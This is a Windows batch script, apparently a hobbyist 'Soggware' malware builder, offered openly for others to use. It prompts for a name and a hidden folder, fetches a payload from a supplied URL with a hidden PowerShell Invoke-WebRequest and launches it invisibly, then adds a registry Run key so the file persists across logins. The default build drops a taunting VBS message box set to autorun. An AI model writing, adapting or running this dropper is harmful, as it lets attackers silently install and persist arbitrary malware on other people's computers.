@echo off
color 0C
title Soggware builder
:: asking for user inputs
echo name of the malware?
set /p malware=">> "
echo file location? example: %userprofile%\appdata\roaming\1idszgfweay
set /p fileloc=">> "
echo do you want to IWR malware? (Y/N)
set /p iwr=">> "
:: checks if the malware already exists in the registry, if it does exist it just exits. otherwise it continues
:: by the way i added the check after the variables were set so that it can check it without it having to read null variables.
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%malware%">nul 2>&1
if %errorlevel%==0 (
    echo malware already exists no need to do this again.
    timeout /t 1 >nul
    exit /b
) else (
    echo malware does not exist, continuing...
)
:: user input for the Invoke Web request.
if /i "%iwr%"=="Y" (
    echo ok bet, provide the link to the malware. if its dropbox add dl=1 to the end of the link
    set /p iwrlink=">> "
    echo provide the file extension of the malware. example: .exe, .vbs, .bat, etc.
    set /p fileext=">> "
    :: downloads the malware using powershell invoke-webrequest, and then executes it in a hidden window.
    powershell -WindowStyle Hidden -Command "$p=Join-Path '%fileloc%' '%malware%'; Try { Invoke-WebRequest -Uri '%iwrlink%' -OutFile $p -UseBasicParsing -ErrorAction Stop; Start-Process -FilePath $p -WindowStyle Hidden } Catch { exit 1 }"
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%malware%" /t REG_SZ /d "%fileloc%\%malware%.%fileext%" /f >nul 2>&1
    exit /b
) else (
    echo skipping download...
    timeout /t 1 >nul
)
if exist "%fileloc%" (
    echo filelocation already exists
    echo skipping
    timeout /t 1 >nul
) else (
    mkdir "%fileloc%" >nul 2>&1
    attrib +h "%fileloc%" >nul 2>&1
)
:main
:: the script i am about to provide is my own script, you are free to use my script but its recommended to make your own.
echo building...
timeout /t 1 >nul
:: creates a vbs file that just shows a message box.
:: change it however you want, this is just an example.
echo MsgBox "Soggyware ratted you gang.", 64, "Soggyware" >> "%fileloc%\%malware%.vbs"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%malware%" /t REG_SZ /d "%fileloc%\%malware%.vbs" /f >nul 2>&1
start "" "%fileloc%\%malware%.vbs"
echo thank you for choosing soggware. come again soon
start "" https://discord.com/invite/29uepW58st
timeout /t 1 >nul
exit /b
